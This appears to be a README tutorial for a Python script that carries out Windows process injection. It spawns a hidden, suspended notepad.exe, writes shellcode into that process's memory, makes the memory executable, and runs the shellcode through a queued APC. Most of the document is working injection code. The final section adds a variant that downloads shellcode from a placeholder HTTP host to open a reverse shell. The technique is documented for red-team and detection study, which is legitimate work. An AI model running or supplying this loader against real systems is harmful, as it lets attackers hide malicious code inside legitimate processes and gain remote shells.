# Process Injection

This script demonstrates how to perform process injection in Python using the Windows API. It creates a suspended process, allocates memory in the target process, writes shellcode, modifies memory protections, and executes the shellcode using Asynchronous Procedure Calls (APC).

## References

- [MITRE ATT&CK - Process Injection](https://attack.mitre.org/techniques/T1055/)
- [Red Canary Threat Detection Report - Process Injection](https://redcanary.com/threat-detection-report/techniques/process-injection/)
- [Windows API - Process Creation Flags](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags)
- [Windows API - Memory Protection Constants](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants)
- [Windows API - CreateProcessA](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
- [Windows API - QueueUserAPC](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
- [Windows API - ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread)
- [Windows API - VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
- [Windows API - VirtualProtectEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex)
- [Windows API - WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
- [Python ctypes Library](https://docs.python.org/3/library/ctypes.html#ctypes.CFUNCTYPE)

## Building the Script

__Initial Setup and Imports__

The script begins with setup operations that prepare the environment for process injection. It imports the Windows API interfaces through ctypes, configures logging for operation tracking, and reads the shellcode from a file into a string buffer.

```python
import os
import logging
from ctypes import *
from ctypes import wintypes

INJECT_PATH = b"C:\\Windows\\System32\\notepad.exe"
INJECT_NAME = os.path.basename(INJECT_PATH.decode("utf-8"))

with open("shellcode", "rb") as shellcode:
    buf = create_string_buffer(shellcode.read())
    buf_size = len(buf)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s: %(message)s'
)
logger = logging.getLogger(__name__)
```

__Structure Definitions__

Windows API operations require specific data structures for process and thread management. The `_SECURITY_ATTRIBUTES` structure controls handle inheritance, `_STARTUPINFOA` determines process window behavior, and `_PROCESS_INFORMATION` stores essential handles and identifiers used throughout the injection process.

```python
class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [
        ('nLength', wintypes.DWORD),
        ('lpSecurityDescriptor', wintypes.LPVOID),
        ('bInheritHandle', wintypes.BOOL)
    ]

class _STARTUPINFOA(Structure):
    _fields_ = [
        ('cb', wintypes.DWORD),
        ('lpReserved', LPTSTR),
        ('lpDesktop', LPTSTR),
        ('lpTitle', LPTSTR),
        ('dwX', wintypes.DWORD),
        ('dwY', wintypes.DWORD),
        ('dwXSize', wintypes.DWORD),
        ('dwYSize', wintypes.DWORD),
        ('dwXCountChars', wintypes.DWORD),
        ('dwYCountChars', wintypes.DWORD),
        ('dwFillAttribute', wintypes.DWORD),
        ('dwFlags', wintypes.DWORD),
        ('wShowWindow', wintypes.WORD),
        ('cbReserved2', wintypes.WORD),
        ('lpReserved2', LPBYTE),
        ('hStdInput', wintypes.HANDLE),
        ('hStdOutput', wintypes.HANDLE),
        ('hStdError', wintypes.HANDLE),
    ]

class _PROCESS_INFORMATION(Structure):
    _fields_ = [
        ('hProcess', wintypes.HANDLE),
        ('hThread', wintypes.HANDLE),
        ('dwProcessId', wintypes.DWORD),
        ('dwThreadId', wintypes.DWORD)
    ]
```

__Constants and Type Definitions__

Memory management and process creation require specific flags that control behavior. These constants define memory allocation types, page protections, and process creation flags. The type definitions ensure proper function calling conventions between Python and the Windows API, with PAPCFUNC being particularly important for the APC queue mechanism.

```python
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
CREATE_NO_WINDOW = 0x08000000
CREATE_SUSPENDED = 0x00000004
PAGE_EXECUTE_READ = 0x20
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)
CREATE_NEW_CONSOLE = 0x00000010
EXECUTE_IMMEDIATELY = 0x0

LPSTARTUPINFOA = POINTER(_STARTUPINFOA)
LPPROCESS_INFORMATION = POINTER(_PROCESS_INFORMATION)
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

PAPCFUNC = CFUNCTYPE(
    None,
    POINTER(wintypes.ULONG)
)
```

__Windows API Function Definitions__

The script defines Windows API functions with their exact parameter types and return values to ensure proper interaction with the operating system. These definitions must be precise to prevent memory corruption or unexpected behavior during process manipulation and memory operations.

```python
CreateProcessA = kernel32.CreateProcessA
CreateProcessA.argtypes = (
    wintypes.LPCSTR,
    LPTSTR,
    LPSECURITY_ATTRIBUTES,
    LPSECURITY_ATTRIBUTES,
    wintypes.BOOL,
    wintypes.DWORD,
    wintypes.LPVOID,
    wintypes.LPCSTR,
    LPSTARTUPINFOA,
    LPPROCESS_INFORMATION
)
CreateProcessA.restype = wintypes.BOOL

# [...]
```
Similarly, other functions such as `QueueUserAPC`, `ResumeThread`, `VirtualAllocEx`, `VirtualProtectEx` and `WriteProcessMemory` are also defined.

__Process Creation__

The process creation phase creates the target process in a suspended state, providing time to perform the injection before process initialization. The _startup information_ structure controls the process's initial state, while the _process information_ structure receives handles for memory manipulation and thread control.

```python
startup_info = _STARTUPINFOA()
startup_info.cb = sizeof(startup_info)
startup_info.dwFlags = 1
startup_info.wShowWindow = 0

process_info = _PROCESS_INFORMATION()
process = CreateProcessA(
    INJECT_PATH,
    None,
    None,
    None,
    False,
    CREATE_SUSPENDED | CREATE_NO_WINDOW,
    None,
    None,
    byref(startup_info),
    byref(process_info)
)
process_id = process_info.dwProcessId
h_process = process_info.hProcess
h_thread = process_info.hThread
thread_id = process_info.dwThreadId

logger.info("Started process '{}' HANDLE: {} PID: {} TID: {}"
    .format(INJECT_NAME, h_process, process_id, thread_id)
)
```

__Memory Allocation and Shellcode Writing__

With the suspended process created, we allocate memory for the shellcode and prepare it for execution. This involves allocating memory with initial _read-write_ permissions, writing the shellcode, and then changing the memory protection to allow execution.

```python
memory_addr = VirtualAllocEx(
    h_process,
    False,
    buf_size,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE,
)
logger.info("Allocated {} bytes to PID: {} at {}"
    .format(buf_size, process_id, hex(memory_addr))
)

WriteProcessMemory(
    h_process,
    memory_addr,
    buf,
    buf_size,
    None
)
logger.info("Wrote {} bytes to PID: {} at {}"
    .format(buf_size, process_id, hex(memory_addr))
)

VirtualProtectEx(
    h_process,
    memory_addr,
    buf_size,
    PAGE_EXECUTE_READ,
    byref(wintypes.DWORD(0))
)
logger.info("Updated memory protection for {} to RWX"
    .format(hex(memory_addr))
)
```

__APC Queue and Thread Resume__

The final phase leverages the _Asynchronous Procedure Call_ mechanism to execute the shellcode. By queuing an APC that points to our shellcode and resuming the suspended thread, we ensure code execution when the thread begins running.

```python
QueueUserAPC(
    PAPCFUNC(memory_addr),
    h_thread,
    None
)
logger.info("Queued APC thread. HANDLE: {} PID: {}"
    .format(h_thread, process_id)
)

ResumeThread(
    h_thread
)
logger.info("Resuming APC thread. HANDLE: {} PID: {}."
    .format(h_thread, process_id)
)
```

## Example output

In this example, I used the `requests` module to fetch the shellcode from an HTTP server and open a reverse shell. The rest of the code remains unchanged.

```python
import requests

r = requests.get("http://$ip_addr:8080/shellcode")
buf = create_string_buffer(r.content)
buf_size = len(buf)
```

![demo](https://github.com/user-attachments/assets/2b21d22c-eea7-491e-ab30-6cea4c235c4b)


